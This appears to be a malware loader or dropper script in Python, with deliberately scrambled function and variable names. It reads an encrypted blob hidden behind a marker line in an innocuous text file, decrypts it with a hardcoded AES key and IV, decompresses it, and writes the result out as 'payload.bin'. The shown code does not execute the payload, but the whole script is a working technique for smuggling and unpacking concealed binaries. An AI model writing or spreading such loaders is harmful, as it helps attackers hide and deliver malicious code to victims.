from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64
import gzip
from io import BytesIO

def vJrGr(jphiO):
    key = base64.b64decode('C63yD6DvBOpCsJOGM6Xrb8NqD+eP8mVlQhia90OsK+M=')
    iv = base64.b64decode('k7BsuukIikJc9gk/tuFGag==')
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()
    padder = padding.PKCS7(128).unpadder()

    decrypted = decryptor.update(jphiO) + decryptor.finalize()
    unpadded = padder.update(decrypted) + padder.finalize()
    return unpadded


def bahjX(jphiO):
    compressed_stream = BytesIO(jphiO)
    decompressed_stream = BytesIO()
    with gzip.GzipFile(fileobj=compressed_stream, mode='rb') as gzip_file:
        decompressed_stream.write(gzip_file.read())
    return decompressed_stream.getvalue()



with open('Bozo.txt', 'r') as file:
    for line in file:
        if line.startswith('MROXEN'):
            SOJPJ = line[6:]
            break

cjdEt = bahjX(vJrGr(base64.b64decode(SOJPJ.strip())))

with open('payload.bin', 'wb') as payload_file:
    payload_file.write(cjdEt)
